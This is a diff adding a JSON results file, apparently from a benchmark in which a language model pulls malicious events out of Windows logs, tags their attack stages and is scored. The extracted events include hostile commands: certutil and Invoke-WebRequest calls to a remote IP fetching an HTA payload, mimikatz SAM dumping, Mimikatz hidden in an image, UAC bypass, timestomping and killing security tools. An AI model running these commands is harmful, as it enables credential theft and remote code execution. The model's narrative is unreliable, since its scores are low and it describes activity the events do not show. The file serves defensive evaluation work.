@@ -1,0 +1,202 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\AppData\\Local\\Temporary\\Internet\\Files\\Content.Outlook\\Test[1].hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c start C:\\ WINDOWS\\System32\\cmd.exe /C \"timeout /t 3 >nul&&echo TestSVC > \\.\\\\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c \"%temp%\\uacme\\23 Akagi64.exe\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c start C:\\ WINDOWS\\System32\\cmd.exe /C \"timeout /t 3 >nul&&echo TestSVC > \\.\\\\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\ USERS\\ADMINI~1\\AppData\\Local\\Temp\\4jcjx4u5\\4jcjx4u5.dll",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\ PROGRAM FILES\\Common Files\\microsoft shared\\VS7DEBUG\\ConvertUtils.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c C:\\ AtomicRedTeam\\atomics\\T1220\\bin\\msxsl.exe C:\\ AtomicRedTeam\\atomics\\T1220\\src\\msxslxmlfile.xml C:\\ AtomicRedTeam\\atomics\\T1220\\src\\msxslscript.xsl",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c del /f /q Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=``2020-10-10 12:12:12``_",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\ USERS\\ADMINI~1\\AppData\\Local\\Temp\\BTGU5RM3\\BTGU5RM3.dll",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::SAM exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net.exe localgroup",
+        "stage": "Discovery"
+      },
+      {
+        "command": "NLTEST.EXE /DOMAIN_TRUSTS",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "wermgr.exe -upload",
+        "stage": "Collection"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "taskkill.exe /f /im WordPad.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill.exe /f /im sangforcat.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\\path_to_powershell_script\\\\module\\\\Invoke-PSImage.ps1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c start powershell && REM \\system32\\cleanmgr.exe /autoclean /d C:",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C cleanmgr.exe /autoclean /d C:",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -decodexxx a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "searchprotocolhost.exe Global\\UsGthrFltPipeMssGthrPipe28_ Global\\UsGthrCtrlFltPipeMssGthrPipe28 1 -2147483646 Software\\Microsoft\\Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)",
+        "stage": "Discovery"
+      },
+      {
+        "command": "searchprotocolhost.exe Global\\UsGthrFltPipeMssGthrPipe28_ Global\\UsGthrCtrlFltPipeMssGthrPipe28 1 -2147483646 Software\\Microsoft\\Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net.exe time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net.exe time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net.exe help time",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C (ls .\\atomic-red-team).lastwrite Time=",
+        "stage": "Collection"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-Resto",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "taskkill.exe /pid WDiStartupService.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "explorer.exe shell:documents\\Documents",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attackers started their campaign with several initial accesses performed through certificate utility tools fetching potential payloads from various remote URLs. These processes executed a series of actions like creating malicious files, modifying registry keys for persistence, executing scripts, establishing lateral movements across networks via svchost, creating backdoors, stealing credentials, deleting files, uploading logs, etc. They also tried to evade defenses such as removing logs created by cmd.exe, attempting to decrypt encrypted files, using steganography techniques to hide the presence of malware, and trying to disable AV protection. Throughout the course of the attacks, they were discovered downloading and running previously uploaded malicious files, generating reports, working on creating fake 'uploads', and exploring directories.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121074,
+      "completion_tokens": 7871,
+      "total_tokens": 128945,
+      "wall_clock_s": 104.102,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.23684210526315788,
+      "recall": 0.225,
+      "f1": 0.23076923076923078,
+      "tp": 9,
+      "fp": 29,
+      "fn": 31
+    },
+    "stage": {
+      "precision": 0.07894736842105263,
+      "recall": 0.07894736842105263,
+      "f1": 0.07894736842105263,
+      "tp": 3,
+      "fp": 35,
+      "fn": 35,
+      "recall_partial": 0.10810810810810811
+    },
+    "hallucination_rate": 0.28125,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121074,
+      "completion_tokens": 7871,
+      "total_tokens": 128945,
+      "wall_clock_s": 104.102,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
